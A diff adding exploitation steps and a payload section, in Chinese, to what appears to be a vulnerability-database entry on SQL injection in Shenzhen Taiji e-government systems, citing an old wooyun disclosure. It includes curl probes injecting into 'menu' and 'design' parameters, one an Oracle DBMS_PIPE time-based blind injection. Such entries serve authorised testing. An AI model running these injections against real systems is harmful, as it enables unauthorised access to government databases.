@@ -23,6 +23,23 @@ fingerprint: ["深圳太极", "太极软件", "sztaiji", "电子政务", "电子
 
 - 目标为深圳太极电子政务/电子监察系统
 
+## 利用步骤
+
+1. 识别目标为深圳太极电子政务/电子监察系统（首页/登录页特征，厂商 sztaiji）
+2. wooyun 原文（wooyun-2014-072715）仅披露注入参数为 `menu` 与 `design`，未披露完整请求路径；需在授权范围内先枚举带这两个参数的功能页面
+3. 对 `menu` / `design` 参数做 Oracle 报错/布尔/时间盲注探测
+4. 结合响应差异确认注入点后，再评估数据库读取范围（原文描述可读取敏感数据，需严格授权，避免破坏性操作）
+
+## Payload
+
+```bash
+# 仅限授权测试：对 menu / design 参数做 Oracle 注入探测（路径按目标实际功能页面替换）
+curl -s "http://target/<接口路径>?menu=1'"
+curl -s "http://target/<接口路径>?design=1'"
+# 通用 Oracle 时间盲注示例（仅授权测试，按目标环境调整）
+curl -s "http://target/<接口路径>?menu=1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--"
+```
+
 ## 验证方法
 
 ```bash
